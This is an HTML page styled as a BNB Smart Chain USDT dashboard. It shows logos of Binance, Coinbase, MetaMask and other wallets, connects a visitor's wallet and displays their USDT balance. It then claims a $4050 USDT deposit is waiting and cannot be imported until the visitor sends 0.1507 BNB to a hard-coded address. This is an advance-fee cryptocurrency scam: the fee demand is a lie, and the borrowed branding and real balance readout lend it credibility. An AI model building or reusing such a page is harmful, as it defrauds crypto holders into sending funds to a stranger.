<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>USDT Dashboard - BNB Smart Chain</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background-color: #0b0e11;
      color: #f0f0f0;
      padding: 2rem;
    }
    h1 {
      text-align: center;
      color: #fcd535;
    }
    .card {
      background-color: #1e2329;
      border-radius: 12px;
      padding: 1.5rem;
      margin: 2rem auto;
      max-width: 600px;
      text-align: center;
      box-shadow: 0 4px 10px rgba(0,0,0,0.4);
    }
    .btn-yellow {
      background-color: #fcd535;
      color: #000;
      padding: 0.75rem 1.5rem;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      margin-top: 1rem;
    }
    .address-box {
      background-color: #121416;
      padding: 1rem;
      border-radius: 8px;
      word-break: break-all;
      font-family: monospace;
      margin: 1rem 0;
    }
    .stat {
      margin-top: 1rem;
    }
    .stat h3 {
      margin: 0.2rem 0;
      color: #fcd535;
    }
    .logos {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 1rem;
      margin: 2rem 0;
    }
    .logos img {
      height: 40px;
      filter: brightness(1.2);
    }
  </style>
</head>
<body>

  <h1>BNB Smart Chain USDT Dashboard</h1>

  <div class="logos">
    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="Binance" />
    <img src="https://cryptologos.cc/logos/bitget-bgb-logo.png" alt="Bitget" />
    <img src="https://cryptologos.cc/logos/bybit-logo.png" alt="Bybit" />
    <img src="https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png" alt="TrustWallet" />
    <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.png" alt="Coinbase" />
    <img src="https://cryptologos.cc/logos/metamask-logo.png" alt="MetaMask" />
    <img src="https://walletconnect.com/walletconnect-logo.svg" alt="WalletConnect" />
  </div>

  <div class="card">
    <p><strong>Connected Wallet Address:</strong></p>
    <div class="address-box" id="walletAddress">Not connected</div>

    <div class="stat">
      <h3 id="usdtBalance">$0.00</h3>
      <p>Your USDT Balance (BEP-20)</p>
    </div>

    <button class="btn-yellow" onclick="connectAndImport()">Connect Wallet & Import USDT</button>
  </div>

  <div class="card">
    <h3>Confirm Incoming Transaction</h3>
    <p>Not Enough BNB to Import: <strong>$4050 USDT</strong></p>
    <p>Top up <strong>0.1507 BNB</strong> to your BSC address:</p>
    <div class="address-box" id="bscAddress">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</div>
    <button class="btn-yellow" onclick="copyAddress()">Copy Address</button>
  </div>

  <!-- WalletConnect + Web3 -->
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>

  <script>
    const usdtAddress = "0x55d398326f99059ff775485246999027b3197955";
    const usdtABI = [
      {
        constant: true,
        inputs: [{ name: "owner", type: "address" }],
        name: "balanceOf",
        outputs: [{ name: "balance", type: "uint256" }],
        type: "function"
      },
      {
        constant: true,
        inputs: [],
        name: "decimals",
        outputs: [{ name: "", type: "uint8" }],
        type: "function"
      }
    ];

    async function connectAndImport() {
      const provider = new WalletConnectProvider.default({
        rpc: {
          56: "https://bsc-dataseed.binance.org/"
        },
        chainId: 56,
        qrcode: true
      });

      try {
        await provider.enable();
        const web3 = new Web3(provider);
        const accounts = await web3.eth.getAccounts();
        const userAddress = accounts[0];

        document.getElementById("walletAddress").innerText = userAddress;

        const contract = new web3.eth.Contract(usdtABI, usdtAddress);
        const decimals = await contract.methods.decimals().call();
        const balanceRaw = await contract.methods.balanceOf(userAddress).call();
        const balanceFormatted = (balanceRaw / Math.pow(10, decimals)).toFixed(2);

        document.getElementById("usdtBalance").innerText = `$${balanceFormatted}`;
      } catch (error) {
        console.error("Connection error:", error);
        alert("Wallet connection failed or canceled.");
      }
    }

    function copyAddress() {
      const address = document.getElementById("bscAddress").innerText;
      navigator.clipboard.writeText(address).then(() => {
        alert("Address copied to clipboard!");
      });
    }
  </script>

</body>
</html>
